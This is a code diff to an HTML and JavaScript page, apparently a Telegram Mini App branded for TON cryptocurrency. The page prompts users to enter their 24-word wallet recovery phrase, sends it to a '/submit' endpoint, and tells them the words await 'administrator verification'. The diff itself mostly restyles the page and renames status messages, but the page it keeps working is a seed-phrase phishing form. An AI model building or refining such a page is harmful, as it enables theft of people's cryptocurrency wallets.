@@ -52,15 +52,8 @@
             display: none !important;
         }
 
-        /* Карточки без движения при наведении */
+        /* Убрал фон, обводку, блюр и тени у карточек - теперь просто контент */
         .wallet-card {
-            background: rgba(28, 32, 44, 0.85);
-            backdrop-filter: blur(20px);
-            border-radius: 32px;
-            padding: 32px 24px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.25);
             width: 100%;
         }
 
@@ -231,11 +224,6 @@
             100% { transform: scale(1) rotate(0); opacity: 1; }
         }
 
-        .success-card {
-            text-align: center;
-            background: linear-gradient(145deg, #1e2e3a, #0f1c26);
-        }
-
         .small-ton {
             display: inline-flex;
             align-items: center;
@@ -254,14 +242,13 @@
             text-align: center;
         }
 
-        .status-banner {
-            background: rgba(0,0,0,0.5);
-            border-radius: 12px;
-            padding: 8px;
-            margin-bottom: 16px;
+        /* Стиль для сообщения об отправке (вместо статус-баннера) */
+        .sending-message {
             text-align: center;
-            font-size: 12px;
-            color: #7cb9e8;
+            padding: 10px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #ffaa44;
         }
 
         @keyframes shake {
@@ -297,16 +284,13 @@
             h2 {
                 font-size: 24px;
             }
-            .wallet-card {
-                padding: 24px 18px;
-            }
         }
     </style>
 </head>
 <body>
 
     <div id="introPage" class="page">
-        <div class="wallet-card" style="text-align: center;">
+        <div style="text-align: center;">
             <div style="display: flex; justify-content: center; gap: 10px; margin-bottom: 16px;">
                 <div class="ton-icon-svg"></div>
                 <div class="ton-icon-svg"></div>
@@ -332,10 +316,10 @@
     </div>
 
     <div id="formPage" class="page hidden">
-        <div class="wallet-card">
+        <div>
             <h2>📝 24 слова</h2>
             <div class="subtext">Только маленькие латинские буквы, без пробелов <span class="small-ton">TON style</span></div>
-            <div id="statusBanner" class="status-banner">🟢 Готов к отправке</div>
+            <div id="sendingMessage" class="sending-message" style="display: none;">⏳ Отправка данных...</div>
             <div class="words-grid">
                 <div class="column" id="col1"></div>
                 <div class="column" id="col2"></div>
@@ -346,7 +330,7 @@
     </div>
 
     <div id="successPage" class="page hidden">
-        <div class="wallet-card success-card">
+        <div style="text-align: center;">
             <div class="success-icon">🎉 🪙 🎉</div>
             <h2 style="background: linear-gradient(135deg, #b9ff9e, #4caf50); -webkit-background-clip: text; background-clip: text;">Спасибо!</h2>
             <p style="font-size: 17px; margin: 16px 0;">Ваши 24 слова успешно отправлены.<br>Ожидайте проверки администратором.</p>
@@ -423,7 +407,7 @@
         const continueBtn = document.getElementById('continueBtn');
         const sendBtn = document.getElementById('sendBtn');
         const closeBtn = document.getElementById('closeBtn');
-        const statusBanner = document.getElementById('statusBanner');
+        const sendingMessage = document.getElementById('sendingMessage');
 
         continueBtn.addEventListener('click', () => {
             introPage.classList.add('hidden');
@@ -431,7 +415,7 @@
             if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
         });
 
-        // ОТПРАВКА ДАННЫХ ЧЕРЕЗ FETCH
+        // ОТПРАВКА ДАННЫХ
         sendBtn.addEventListener('click', async () => {
             const wordsArray = [];
             let hasError = false;
@@ -478,8 +462,9 @@
             
             sendBtn.disabled = true;
             sendBtn.style.opacity = '0.6';
-            statusBanner.innerHTML = '⏳ Отправка данных...';
-            statusBanner.style.color = '#ffaa44';
+            sendingMessage.style.display = 'block';
+            sendingMessage.innerHTML = '⏳ Отправка данных...';
+            sendingMessage.style.color = '#ffaa44';
             
             try {
                 const response = await fetch('/submit', {
@@ -491,8 +476,8 @@
                 });
                 
                 if (response.ok) {
-                    statusBanner.innerHTML = '✅ Отправлено успешно!';
-                    statusBanner.style.color = '#88ff88';
+                    sendingMessage.innerHTML = '✅ Отправлено успешно!';
+                    sendingMessage.style.color = '#88ff88';
                     if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
                     
                     formPage.classList.add('hidden');
@@ -503,10 +488,15 @@
                 }
             } catch(e) {
                 console.error("Ошибка:", e);
-                statusBanner.innerHTML = '❌ Ошибка отправки. Попробуйте еще раз.';
-                statusBanner.style.color = '#ff6666';
+                sendingMessage.innerHTML = '❌ Ошибка отправки. Попробуйте еще раз.';
+                sendingMessage.style.color = '#ff6666';
                 sendBtn.disabled = false;
                 sendBtn.style.opacity = '1';
+                setTimeout(() => {
+                    if (sendingMessage.style.display !== 'none') {
+                        sendingMessage.style.display = 'none';
+                    }
+                }, 3000);
                 alert("❌ Ошибка отправки. Проверьте подключение.");
                 if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('error');
             }
